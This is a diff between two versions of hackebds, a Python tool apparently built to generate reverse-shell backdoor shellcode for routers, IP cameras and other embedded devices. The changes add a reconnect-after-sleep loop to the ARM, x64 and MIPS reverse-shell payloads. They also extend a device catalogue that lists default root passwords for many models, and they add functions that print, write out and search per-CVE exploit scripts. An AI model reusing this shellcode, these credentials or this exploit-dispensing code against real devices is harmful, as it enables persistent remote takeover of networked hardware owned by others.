@@ -2695,17 +2857,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
 		shellcode += shellcraft.fork()
 
 		shellcode += '''
 	mov r3,r0
@@ -2751,16 +2910,27 @@
 
 		shellcode += '''
 main_lab:
 	'''
 
 		shellcode += shellcraft.wait4("r3")
 
+		shellcode += """
+ldr r10, ={time}
+eor r5, r5
+push {{r5}}
+push {{r10}}
+mov r0, sp
+mov r7, 0xa2
+svc #0
+pop {{r5,r10}}
+	""".format(time=sleep_time)
+
 		shellcode += '''
-b main
+b _start
 nop
 	'''
 
 	else:
 		log.info("now shell is only support sh and bash")
 		return 
 	if(envp == None):
@@ -2816,15 +2986,15 @@
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
-def x64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def x64_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.arch = 'amd64'
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
 	shell_path_list = []
 	if shell_path == "/bin/bash" or shell_path == "bash":
@@ -2862,16 +3032,21 @@
 	shellcode += shellcraft.exit(0)
 	shellcode += '''
 main_lab:
 	push 61
 	pop rax
 	xor rdi,rdi
 	syscall
+	push 0x0
+	push {time}
+	mov  rdi, rsp
+	mov rax, 35
+	syscall
 	jmp _start
-	'''
+	'''.format(time=sleep_time)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
 		filename=context.arch + "-power-" + my_package.random_string_generator(4,chars)
 		my_package.my_make_elf(shellcode, filename)
 		log.success("{} is ok in current path ./".format(filename))
 		context.arch = 'i386'
@@ -2901,18 +3076,19 @@
 				return 
 
 '''
 add 2023.2.28
 fork 0x0017a7
 wait4 0x0017ab
 exit 0x00183d
+sleep 0x00001792
 '''
 
 
-def mipsn32_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mipsn32_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time,filename=None):
 	context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
 	context.arch = 'mipsn32'
 	context.endian = "big"
 	context.bits = "32"
 	if(my_package.get_mipsn32_binutils(context.arch) == 1):
 		return 
 	log.success("reverse_ip is: "+ reverse_ip)
@@ -3102,14 +3278,26 @@
 slti    $a1, $zero, -1
 slti    $a2, $zero, -1
 slti    $a3, $zero, -1
 li      $v0, 0x0017ab
 syscall 0x40404
 	"""
 
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1792
+syscall 0x40404
+	""".format(time=sleep_time)
+
 	shellcode += '''
 j __start
 nop
 	'''
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
@@ -3139,15 +3327,15 @@
 				context.arch='i386'
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 			
 
-def mipsn32el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, filename=None):
+def mipsn32el_power_reverse_shell(shell_path,reverse_ip, reverse_port, envp, sleep_time ,filename=None):
 	context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
 	context.arch = 'mipsn32el'
 	context.endian = "little"
 	context.bits = "32"
 	if(my_package.get_mipsn32_binutils(context.arch) == 1):
 		return 
 	log.success("reverse_ip is: "+ reverse_ip)
@@ -3333,14 +3521,26 @@
 slti    $a1, $zero, -1
 slti    $a2, $zero, -1
 slti    $a3, $zero, -1
 li      $v0, 0x0017ab
 syscall 0x40404
 	"""
 
+	shellcode += """
+xor  $t0,$t0,$t0
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+li   $t0,{time}
+addiu $sp, $sp, -4
+sw   $t0, 0($sp)
+move $a0,$sp
+li   $v0, 0x1792
+syscall 0x40404
+	""".format(time=sleep_time)
+
 	shellcode += '''
 j __start
 nop
 	'''
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
```

### Comparing `hackebds-0.3.6/hackebds/hackebds_cmd.py` & `hackebds-0.3.7/hackebds/hackebds_cmd.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/powerpc_info.py` & `hackebds-0.3.7/hackebds/powerpc_info.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/cve_info.py` & `hackebds-0.3.7/hackebds/cve_info.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/model_choise.py` & `hackebds-0.3.7/hackebds/model_choise.py`

 * *Files 4% similar despite different names*

```diff
@@ -3,14 +3,15 @@
 from statistics import mode
 from pwn import log,shellcraft
 import platform
 from colorama import Fore,Back,Style
 from multidict import CIMultiDict
 from . import exp_database
 from fuzzywuzzy import process
+import re
 '''
 Equipment model -> backdoor model
 This is a learning module. After the generation, add the device model. The tool will remember it after the next use, accelerating the generation of the backdoor and shell code next time
 
 1 arch 0 model 1
 2 arch
 '''
@@ -21,15 +22,14 @@
 
 '''
 information for model
 [arch, function ,os ,cpu_vender ,cpu , web_server, SSH_support,Eavesdropping, default_telnet_username, default_telnet_passwd ,sdk_link,support_for_openwrt, is_vulnerable]
 '''
 
 
-model_arch_tree["RV_340"] = "armelv7"
 
 
 
 ####TOTOLINK
 #model_tree["TOTOLINK_A850R"] = ["mips", "linux" , "Realtek" ,"RTL8192ER", "https://github.com/doudoudedi","False", "Ture", poc]
 
 '''
@@ -56,21 +56,23 @@
  
 	model_tree["Netgear_WNDR3700v2"] = ['mips', "router", "linux", "Atheros", "AR7161", "uhttpd", "False", "False", "admin", "Default Password", "unknow", "True", "True", exp_database.model_exp_dic["Netgear_WNDR3700v2"]]
  
 	model_tree["TL-WR802N(US)_V4"] = ['mipsel', "router", "linux", "Mediatek", "MT7628N", "httpd", "False", "False", "unknow", "unknow", "unknow", "True", "True", exp_database.model_exp_dic['TL-WR802N(US)_V4']]
 	
 	model_tree["Tenda_AX1806"] = ['armelv7', "router", "linux", "Broadcom", "BCM6755", "tdhttpd(like goahead)", "False", "False", "unknow", "unknow","unknow", "False", "True", exp_database.model_exp_dic["Tenda_AX1806"]]
  
+	model_tree["TL-WPA4530_KIT_V2"] = ["mipsel", "wifi_extender", "linux", "unknow", "unknow", "httpd(self)","False", "False", "root", "sohoadmin", "unknow", "False", "True", exp_database.model_exp_dic["TL-WPA4530_KIT_V2"]]
+	
 	'''
 	Router
 	'''
 
 	model_tree["TOTOLINK_X5000R"] = ['mipsel', "router", "linux","MediaTek", "MT7621AT", "lighttpd","False","False", 'root', 'cs2012',"unknow", "True", "True" , exp_database.model_exp_dic["TOTOLINK_X5000R"]]
 
-	model_tree["TOTOLINK_A8000RU"] = ['aarch64(armv8)', "router","linux", "MediaTek", "MT7622","lighttpd","False","False", 'root', 'cs2012', "unknow", "True", "True", {}]
+	model_tree["TOTOLINK_A8000RU"] = ['aarch64', "router","linux", "MediaTek", "MT7622","lighttpd","False","False", 'root', 'cs2012', "unknow", "True", "True", {}]
 
 	model_tree["TOTOLINK_A7000R"] = ['mipsel', 'router' ,"linux", "MediaTek","MT7621AT",'lighttpd',"False","False", 'root', 'cs2012',"unknow" ,"True", 'True' ,exp_database.model_exp_dic["TOTOLINK_A7000R"]]
 
 	model_tree["TOTOLINK_A850R"] = ["mips", "router" ,"linux" , "Realtek" ,"RTL8192ER", 'boa', "False","False", 'root', '',"https://sourceforge.net/projects/rtl819x/","False", "True", {}]
 
 	model_tree["TOTOLINK_N600R"] = ["mips", "router" ,"linux", "Realtek" ,"RTL8196D", "lighttpd", "False","False", 'root', 'cs2012',"https://sourceforge.net/projects/rtl819x/", "False", "True", exp_database.model_exp_dic["TOTOLINK_N600R"]]
 
@@ -124,28 +126,28 @@
 
 	model_tree["H3C_magic_R100"] = ["mips", "router", "linux", "RealTek", "RTL8196E", "boa", "False", "False", "root", "root", "https://sourceforge.net/projects/rtl819x/", "False", "True", exp_database.model_exp_dic["H3C_magic_R100"]]
 
 	#model_tree["H3C_TX1801_Plus"] = ["", "", "", "MediaTek", "MT7621AT"]
 
 	model_tree["DSL-AC3100"] = ["armelv7","router", "linux", "Broadcom", "BCM63138", "httpd", "False", "False", "root", "NULL", "unknow", "True", "True", exp_database.model_exp_dic["DSL-AC3100"]]
 
-	model_tree["Buffalo_WSR-2533DHP2"] = ["aarch64(armv8)" ,"router", "linux", "MediaTek", "MT7622B", "unknow", "False", "False", "unknow", "unknow", "unknow", "True", "True",exp_database.model_exp_dic["DSL-AC3100"]]
+	model_tree["Buffalo_WSR-2533DHP2"] = ["aarch64" ,"router", "linux", "MediaTek", "MT7622B", "unknow", "False", "False", "unknow", "unknow", "unknow", "True", "True",exp_database.model_exp_dic["DSL-AC3100"]]
 
 
 	model_tree["Tenda_AC6v2"] = ["mipsel", "router", "linux", "Realtek", "RTL8197FN", "httpd(linke goahead)", "False", "False", "root", "unknow", "https://sourceforge.net/projects/rtl819x/","False", "True", exp_database.model_exp_dic["Tenda_AC6v2"]]
 
 	model_tree["Tenda_AC6v5"] = ["mips", "router", "RTOS", "Realtek", "RTL8197FH", "no", "False", "False", "not support", "not support", "https://sourceforge.net/projects/rtl819x/","False", "unknow", {}]
 
 	#model_tree["xiaomi_wifi_R3"] = ["mipsel", "router", "linux", "MediaTek", "MT7621AT", "sysapihttpd(niginx)", "True", "False", "root", "unknow", "unknow","True", "True", exp_database.model_exp_dic["mi_wifi_R3"]]
 
 	model_tree["Netgear_R6300v1"] = ["mipsel", "router", "linux", "Broadcom", "BCM4706(MIPS 74Kc)", "httpd(like goahead)", "False", "False", "NULL", "NULL", "unknow", "True", "True", {}]
 
 	model_tree["Netgear_R8300"] = ["armelv7", "router", "linux", "Broadcom","BCM47094(Cortex-A9)", "httpd(like goahead)", "False", "False", "NULL", "NULL", "unknow", "True", "True", exp_database.model_exp_dic["Netgear_R8300"]]
 
-	model_tree["Tenda_FH330"] = ["arm?", "router", "ecos", "Broadcom", "BCM5357C0", "no", "False", "False", "not support", "not support", "unknow", "False", "unknow", {}]
+	model_tree["Tenda_FH330"] = ["arm?", "router", "ecos", "Broadcom", "BCM5357C0", "ecos", "False", "False", "not support", "not support", "unknow", "False", "unknow", {}]
 
 	model_tree["TL-WR841Nv12_us"] = ["mips", "router", "linux", "Atheros", "QCA9533 @ 560 MHz,", "httpd", "False", "False", "root", "shoadmin", "unknow", "True", "True", exp_database.model_exp_dic["TL-WR841Nv12_us"]]
 
 	model_tree["TL-WDR5620v1"] = ["mipsel", "router", "linux", "MediaTek", "MT7628A", "uhttpd", "False", "False", "root", "NULL", "unknow", "True", "True", exp_database.model_exp_dic["TL-WDR5620v1"]]
 
 	model_tree["TOTOLINK_A950RG"] = ["mipsel", "router", "linux", "MediaTek", "MT7621A", "lighttpd", "False", "False", "root", "cs2012", "unknow", "False", "True", exp_database.model_exp_dic["TOTOLINK_A950RG"]]
 
@@ -214,15 +216,15 @@
 
 	model_tree["DIR-619L"] =["mips", "router", "linux", "Realtek", "RTL8192CE", "boa", "False", "False", "root", "realtek", "unknow", "False", "True", exp_database.model_exp_dic["DIR-619L"]]
 	
 	model_tree["Netgear_WAC104"] = ["mipsel", "router" , "linux" ,"MediaTek", "MT7621ST", "mini_httpd", "False", "False", "root", "Default passwd", "unknow", "True", "True", exp_database.model_exp_dic["Netgear_WAC104"]]
  
 	model_tree["ASUS_RT-AX56U"] = ["armelv7", "router", "linux", "Broadcom","BCM6755(Cortex-A9)","httpd(self)", "True", "False", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["ASUS_RT-AX56U"]]
 
-	model_tree["GT-AC2900"] = ["aarch64(armv8)" ,"router","linux" ,"Broadcom", "BCM4906(Cortex-A53)", "httpd(self)", "True", "False", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["GT-AC2900"]]
+	model_tree["GT-AC2900"] = ["aarch64" ,"router","linux" ,"Broadcom", "BCM4906(Cortex-A53)", "httpd(self)", "True", "False", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["GT-AC2900"]]
 
 	model_tree["Netgear_WNR1000v3"] = ["mipsel", "router", "linux", "Broadcom", "BCM5356", "httpd(self)", "False", "False",  "admin", "Default passwd", "unknow", "True", "True", exp_database.model_exp_dic['Netgear_WNR1000v3']]
 	
 	model_tree["ASUS_RT_AC88U"] = ["armelv7", "router", "linux", "Broadcom","BCM4709C0KFEBG(Cortex-A9)", "httpd(self)","True", "False", "unknow", "unknow", "unknow", "True", "True", exp_database.model_exp_dic["ASUS_RT_AC88U"]]
 
 	model_tree["Netgear_WNDR4500v2"] = ['mipsel', "router", "linux", "Broadcom", "BCM4706", "httpd(self)", "False", "False",  "admin", "Default passwd", "unknow", "True", "True", exp_database.model_exp_dic['Netgear_WNDR4500v2']]
 
@@ -247,32 +249,53 @@
 
 	model_tree["DIR-867_A1"] = ["mipsel", "router", "linux", "MediaTek", "MT7621AT","lighttpd", "False", "False", "admin", "Default passwd", "unknow", "True", "True", exp_database.model_exp_dic["DIR-867"]]
   
 	model_tree["H3C_B5_Mini"]  = ['mipsel', "router", "linux", "Realtek", "RTL8197FS", "webs(like goahead)", "False", "False","root", "unknow", "https://sourceforge.net/projects/rtl819x/", "False", "True", exp_database.model_exp_dic['H3C_B5_Mini']]
  
 	model_tree["Nighthawk_RAX43"] = ["armelv7",  "router", "linux", "Broadcom","BCM6750", "lighttpd", "True", "False", "admin", "Default Passwd", "unknow", "False", "True", exp_database.model_exp_dic['Nighthawk_RAX43']]
  
+	model_tree["Hongdian_H8922"] = ['mipsel', "Industrial Router", "linux","Broadcom", "BCM5357", "lighttpd", "False", "False", "root", "superzxmn", "unknow", "False", "True", exp_database.model_exp_dic["Hongdian_H8922"]]
+ 
+	model_tree["TOTOLINK_A3000RU"] = ["mipsel", "router" , "linux","Realtek" , "RTL8197F", "lighttpd", "False", "False", "root", "cs2012", "https://sourceforge.net/projects/rtl819x/", "False", "True", exp_database.model_exp_dic["TOTOLINK_A3000RU"]]
+ 
+	model_tree["linksys_E2000v1"] = ['mipsel', "router", "linux","Broadcom", "BCM4717", "httpd(self)", "False", "False", "not support", "not support", "unknow", "True", "True", exp_database.model_exp_dic["linksys_E2000v1"]]
+  
+	model_tree["GO-RT-AC750"] = ['mips', "router", "linux","unknow", "unknow", "httpd(self)", "False", "False", "NULL", "NULL", "unknow", "False", "True", exp_database.model_exp_dic["GO-RT-AC750"]]
 	#model_tree["Netgear_R6200"] = ['']
  
+	#model_tree["Ruijie_RG-EW1200"] = []
+	model_tree["TP-Link_Archer_VR1600V"] = ["unknow", "router", "linux", "unknow", "unknow", "unknow", "False", "False", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["TP-Link_Archer_VR1600V"]]
+ 
+	model_tree["DIR-866L"] = ['mips', "router", "linux","Qualcomm", "Qualcomm Atheros QCA9558", "lighttpd", "False", "False", "root", "NULL", "unknow", "False", "True", exp_database.model_exp_dic['DIR-866L']]
+ 
+	model_tree["DIR-862L"] = ['mips', "router", "linux","Qualcomm", "Qualcomm Atheros QCA9558", "lighttpd", "False", "False", "root", "NULL", "unknow", "False", "True", exp_database.model_exp_dic['DIR-862L']]
+ 
+	model_tree["TP-Link_Archer_AX21"] = ["armelv7(or aarch64)", "router", "linux", "Broadcom", "BCM6755(Cortex-A7) ", "uhttpd", "True", "False", "root", "NULL", "unknow", "True", "True", exp_database.model_exp_dic["TP-Link_Archer_AX21"]]
+ 
+	model_tree["Netgear_R9000"] = ["armelv7", "router", "linux", "Annapurna Labs", "Annapurna Labs AL314", "uhttpd", "False", "False", "not support", "not support", "unknow", "True", "True", exp_database.model_exp_dic["Netgear_R9000"]]
+	
 	model_tree["TL-MR3020_V1"] = ['mips', "router", "linux", "Qualcomm Atheros", "AR9331", "httpd(self)", "False", "False", "root(Admin)", "5up", "unknow", "True", "True", exp_database.model_exp_dic["TL-MR3020_V1"]]
+	
+	model_tree["DIR-600_vB"] = ["mipsel", "router", "linux", "Realtek", "RTL8196E", "httpd(self)", "False", "False", "NULL", "NULL", "https://sourceforge.net/projects/rtl819x/", "False", "True", exp_database.model_exp_dic['DIR-600_vB']]
 	'''
 	AP wifi
  	'''
 	model_tree["H3C_A210-G"] = ["unknow", "AP_wifi", "linux", "Realtek(??)","unknow", "like goahead","False", "False", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["H3C_A210-G"]]
   
+	model_tree['TRENDnet_TEW-755AP'] = ["mips", "AP_wifi", "linux",  "Qualcomm", "Atheros QCA9558",  "uhttpd", "True", "False", "root", "NULL", "unknow","True", "True", exp_database.model_exp_dic['TRENDnet_TEW-755AP']]
 	'''
 	Modem
 	'''
 	model_tree["fenghuo_MR820"] = ["mips(router)&&arm(android)", "Modem", "linux&&android", "MediaTek && ??","RTL-8676S&&??", "boa", "False", "False", "unknow", "unknow", "unknow", "False", "True", {}]
 
 	model_tree["Netgear_DGN1000v1"] = ['mips', "Modem", "linux", "Infineon/Lantiq","Lantiq PSB 50601 HL v1.2", "mini_httpd", "False", "False", "NULL", "NULL", "unknow", "False", "True", {}]
 
 	model_tree["Buffalo_WSR-2533DHPL"] = ["mipsel", "Modem&&router", "linux", "MediaTek", "MT7621A", "httpd", "False", "False" ,"unknow", "unknow", "unknow", "True", "True",exp_database.model_exp_dic["Buffalo_WSR-2533DHPL"]]
 
-	model_tree["Buffalo_WSR-3200AX4S"] = ["aarch64(armv8)", "Modem&&router", "linux", "MediaTek", "MT7622", "httpd", "False", "False", "root", "unknow", "unknow","True", "True",exp_database.model_exp_dic["Buffalo_WSR-2533DHPL"]]
+	model_tree["Buffalo_WSR-3200AX4S"] = ["aarch64", "Modem&&router", "linux", "MediaTek", "MT7622", "httpd", "False", "False", "root", "unknow", "unknow","True", "True",exp_database.model_exp_dic["Buffalo_WSR-2533DHPL"]]
  
 	model_tree["Netgear_D7000v1"] = [ "armelv7" ,"Modem&&router" ,"linux", "Broadcom", "BCM63138(Cortex A9)", "mini_httpd", "False", "False", "root", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["Netgear_D7000v1"]]
 
 	model_tree["Netgear_MBR1515"] = ["mipsel", "Modem&&router", "linux", "Broadcom", "BCM4717A1", "httpd(self)", "False", "False", "admin", "Default passwd", "unknow", "False", "True", exp_database.model_exp_dic['Netgear_MBR1515']]
  
 	model_tree["Netgear_MBR1516"] = ["mipsel", "Modem&&router", "linux", "Broadcom", "BCM4717A1", "httpd(self)", "False", "False", "admin", "Default passwd", "unknow", "False", "True", exp_database.model_exp_dic['Netgear_MBR1516']]
  
@@ -284,66 +307,78 @@
 
 	model_tree["Netgear_WNR834Bv2"] = ["mipsel" , "Modem&&router", "linux-2.4.20", "Broadcom", "BCM4704", "httpd(self)","False", "False", "admin", "Default passwd", "unknow","False", "True", exp_database.model_exp_dic["Netgear_WNR834Bv2"]]
 
 	model_tree["Netgear_WNDR3300"] = ["mipsel", "Modem&&router", "linux", "Broadcom", "BCM4704", "httpd(self)","False", "False", "admin", "Default passwd", "unknow", "False", "True", exp_database.model_exp_dic["Netgear_WNDR3300"]]
 
 	model_tree["Netgear_WNDR3400v2"] = ["mipsel",  "Modem&&router", "linux", "Broadcom", "BCM5358UB0", "http(self)", "False", "False", "admin", "Default passwd", "unknow", "True", "True", exp_database.model_exp_dic["Netgear_WNDR3400v2"]]
 
+	model_tree["DSL-3782"] = ['mips', "Modem&router", "linux", "MediaTek","MT7511T", "boa", "True", "False", "admin", "admin", "unknow", "False", "True", exp_database.model_exp_dic["DSL-3782"]]
+
+	model_tree["DIR-890L"] = ["armelv7", "router", "linux", "Broadcom", "BCM4709A", "httpd(self)", "False", "False", "NULL", "NULL", "unknow", "False", "True", exp_database.model_exp_dic['DIR-890L']]
+
+	model_tree["tenda_AC15"] = ["armelv7", "router", "linux", "Broadcom", "BCM4708A0", "httpd(like goahead)", "False", "False","root", "unknow", "unknow", "False", "True", exp_database.model_exp_dic['tenda_AC15']]
+	
+	model_tree["DIR-823G_A1"] = ["mipsel", "router", "linux", "Realtek", "RTL8197F", "goahead", "False", "False", "root", "NULL", "https://sourceforge.net/projects/rtl819x/", "False", "True", exp_database.model_exp_dic["DIR-823G_A1"]]
+	
 	'''
 	Firewall
 	'''
 	model_tree["F5_BIG-IP"] = ["x64", "Firewall","linux", "intel", "X3220  @ 2.40GHzstepping 4core","Apache and Tomcat" ,"True", "True", "not support", "not support", "no have", "False", "True" , exp_database.model_exp_dic["F5_BIG-IP"]]
 
-	model_tree["Zyxel_USG_FLEX_500"] = ["mips32n", "Firewall", "linux", "unknow", "unknow(Cortex A9)", "Apache", "True", "False", "no", "no", "unknow", "False", "True", exp_database.model_exp_dic["Zyxel_USG_FLEX_500"]]
+	model_tree["Zyxel_USG_FLEX_500"] = ["mips32n", "Firewall", "linux", "Marvell", "CN7020p1.2-1200-AAP", "Apache", "True", "False", "no", "no", "unknow", "False", "True", exp_database.model_exp_dic["Zyxel_USG_FLEX_500"]]#Correct errors and update schema
 
 
 	'''
 	camera
 	'''
-	model_tree["dh_ipc-kw12_chn"] = ['armelv5', "IP camera", "linux", "HuaWei", "hi3518", "sonia", "False",'True','admin' ,'7ujMko0admin' ,"unkonw", "unkonw", "False", {}]
+	model_tree["dh_ipc-kw12_chn"] = ['armelv5', "IP camera", "linux", "HuaWei HiSilicon", "hi3518", "sonia", "False",'True','admin' ,'7ujMko0admin' ,"unkonw", "unkonw", "False", {}]
 
 	model_tree["DCS-5010L"] = ['mipsel', "IP camera and wireless repeater", "linux", "unknow(Ralink)", "unknow", "alphapd", "False", "True", "root", "NULL", "unknow", "False", "True", {}]
 
 	model_tree["DCS-5020L"] = ['mipsel', "IP camera and wireless repeater", "linux", "Mediatek" ,"RT3352F", "alphapd","False", "True", "root", "NULL",  "unknow", "False but have Beta", "True", {}]
 
 	model_tree["Hikvision_DS-2CD2xx0F-ISeries"] = ["armelv5", "IP camera and wireless repeater", "linux", "HUAWEI", "hixxx", "unknow", "True", "unknow", "unknow", "unknow", "unknow" ,"False", "True", exp_database.model_exp_dic["DS-2CD2xx0F-ISeries"]]
 
-
+	model_tree["TP-Link_Tapo_c200"] = ['armelv7', "IP camera", "linux", "HuaWei HiSilicon", "Hi3516E", "unknow","False", "True", "unknow", "unknow", "unknow", "True", "True", exp_database.model_exp_dic["TP-Link_Tapo_c200"]]
 
 	model_tree["DCS-93xL"] = ["mipsel", "IP camera", "linux","Ralink","RT3050F && RT5350F", "alphapd","False", "True","admin", "NULL", "unknow" ,"True", "True", exp_database.model_exp_dic["DCS-93xL"]]
 
 	model_tree["DCS-2530L"] = ["unknow", "IP camera", "unknow", "unknow","unknow","unknow","False","True", "unknow", "unknow", "unknow" ,"False", "True", exp_database.model_exp_dic["DCS-2530L"]]
 
-	model_tree["DCS-1130"] = ["armelv5", "IP camera", "linux", "unknow", "unknow", "False", "True", "lighttpd", "root", "NULL", "unknow", "False", "True", {}]
+	model_tree["DCS-1130"] = ["armelv5", "IP camera", "linux", "unknow", "unknow","lighttpd",  "False", "True", "root", "NULL", "unknow", "False", "True", {}]
  
+	model_tree["iptime_c200"] = ['mipsel', "IP camera", "linux", "unknow", "unknow", "lighttpd", "False", "True", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["iptime_c200"]]
+
+	model_tree["tenda_cpx"] = ["armelv7", "IP camera", "linux", "unknow", "unknow", "unknow", "False", "True", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["tenda_cpx"]]
+
 	'''
 	DVR
  	'''
 	model_tree["TBK_DVR"] = ["armelv7", "DVR", "linux", "unknow", "unknow", "False", "True", "unknow", "Not", "Not", "unknow", "False", "True", exp_database.model_exp_dic["TBK_serise_DVR"]]
  
 
 	'''
 	switch
  	'''
 	model_tree["Netgear_GS110TPv3"] = ['aarch64', "switch", "linux", "Marvell", "Marvell Armada 3720","unkonw", "True", "False", "admin", "default passwd", "unknow", "False", "True", exp_database.model_exp_dic["Netgear_GS110TPv3"]]
  
 	model_tree["TL-SG105PE_V1"] = ["armel", "switch", "ROS(RTOS)", "Realtek", "RTL8367S","unknow", "False", "False", "no", "no", "unknow", "False", "True", {}]
- 
 	'''
 	ap
  	'''
 	model_tree["DWL-2600AP"] = ["mipsel", "access point", "linux","Broadcom", "BCM5358B0", "unknow","True", "False", "admin", "Default passwd", "unknow", "False", "True", exp_database.model_exp_dic["DWL-2600AP"]]
 	'''
 	information for model
 	[arch, function ,os ,cpu_vender ,cpu , web_server, SSH_support,Eavesdropping, default_telnet_username, default_telnet_passwd ,sdk_link,support_for_openwrt, is_vulnerable]
 	'''
 
 	model_tree["DI-713P"] = ["mipsel", "D-link integrated Access Device4", "linux", "Ralink", "RT3050", "unknow", "unknow", "unknow", "unknow", "unknow", "unknow", "False", "True", exp_database.model_exp_dic["DI-713P"]]
 
-
+	for key, value in model_tree.items():
+		model_arch_tree[key] = model_tree[key][0]
 
 
 def get_system_version():
 	return platform.system()
 
 
 
@@ -417,18 +452,18 @@
 def print_mmodel_dic():
 	try:
 		dict_2 = dict(sorted(model_arch_tree.items(), key=lambda i:i[0]))
 		#print(dict_2)
 		log.success("model ----> arch:")
 
 		for key,value in dict_2.items():
-			print("-"*0x29)
-			print("|"+Fore.GREEN+key.ljust(15)+Fore.RESET+"----->    "+Fore.GREEN+value.ljust(14)+Fore.RESET+"|")
+			print("-"*0x45)
+			print("|"+Fore.GREEN+key.ljust(25)+Fore.RESET+"----->    "+Fore.GREEN+value.ljust(32)+Fore.RESET+"|")
 
-		print("-"*0x29)
+		print("-"*0x45)
 
 	except Exception as e:
 		print(e)
 
 def model_tree_dic():
 	if(os.path.exists(model_tree_info_dicname)):
 		#print(model_tree.items())
@@ -679,15 +714,18 @@
 			log.success("Vulnable {}".format(model_tree[model][12]))
 			log.success("Vulnerability information is as follows:")
 			print("-"*0x40)
 			if (model_tree[model][13] != {}):
 				#print(model_tree[model][13].items())
 				for k,v in model_tree[model][13].items():
 					print(Fore.GREEN + k + Fore.RESET+ "  :  " +  v[0])
-					print("-"*0x40)
+					if(v[1]!=None and len(v[1])!=0):
+						print("{}'s EXP or POC:".format(k))
+						print(v[1])
+						print("-"*0x40)
 					#print(k+": "+v[0])
 			else:
 				print("Maybe this POC is not included in the script")
 
 		else:
 			log.info("Vulnable {}".format(model_tree[model][12]))
 		'''
@@ -728,33 +766,50 @@
 			print("|"+Fore.GREEN+k[0].ljust(0x20)+Fore.RESET+"Similarity:".ljust(0x10, ' ')+str(k[1])+"%"+"|")
 
 	print("-"*0x35+"\n")
 
 	if (top[0][1]!=0):
 		print_model_information(top[0][0]) # print most
 
+		
+
 	return top[0][0]
 
+def is_valid_python_code(code):
+	try:
+		compile(code, "<string>", "exec")
+		return True
+	except Exception as e:
+		return False
+
 
 def get_poc(model):
 	if(model_tree[model][13] == {}):
 		log.info("POC is not included temporarily")
 		return 
 	for key,value in model_tree[model][13].items():
 		log.success("POC generation information:")
 		log.success("{} ----> {}".format(model, key))
 		if(os.path.exists(key) !=True):
-			with open(key, "w") as f:
-				f.write(value[1])
+			if(is_valid_python_code(value[1])):
+				with open(key+".py", "w") as f:
+					f.write(value[1])
+			else:
+				with open(key, "w") as f:
+					f.write(value[1])
 		else:
 			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
 			choise = input()
 			if choise == "y\n" or choise == "\n":
-				with open(key, "w") as f:
-					f.write(value[1])
+				if(is_valid_python_code(value[1])):
+					with open(key+".py", "w") as f:
+						f.write(value[1])
+				else:
+					with open(key, "w") as f:
+						f.write(value[1])
 			else:
 				return
 
 def add_model_info():
 	log.info("The next step is to add/edit device information")
 	log.info("The Model is ? ")
 
@@ -876,8 +931,35 @@
 	model_tree_dic()
 #append_to_tree("DIR-816",'mips')
 #print(model_to_arch("DIR-832"))
 #print_model_information("TOTOLINK_A7000R")
 #model_tree_dic()
 #dic_model_tree()
 #search_model("N600R")
-#model_tree_dic()
+#model_tree_dic()
+
+
+def search_CVE(CVE_ID):
+	flag=0
+	value_pattern = re.compile(CVE_ID, re.IGNORECASE)
+	for value in model_tree.values():
+			for key in value[13].keys():
+				if(value_pattern.match(key)):
+					CVE_ID = key
+					print(Fore.GREEN + CVE_ID + Fore.RESET+ "  :  " +  value[13][CVE_ID][0])
+					print("-"*0x40)
+					print("EXP or POC: ")
+					print( value[13][CVE_ID][1] +Fore.RESET)
+					print("-"*0x40)
+					flag = 1
+
+	if(flag!=1):
+		log.failure("not found")
+
+'''
+def demo_test():
+	for key,value in model_tree.items():
+		if value[13]!= {}:
+			for k,v in value[13].items():
+				print("-"*0x40)
+				print(k +": "+ str(is_valid_python_code(v[1])))
+'''
```

### Comparing `hackebds-0.3.6/hackebds/__init__.py` & `hackebds-0.3.7/hackebds/__init__.py`

 * *Files 2% similar despite different names*

```diff
@@ -612,47 +612,44 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r4,sp,#-0x1d
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
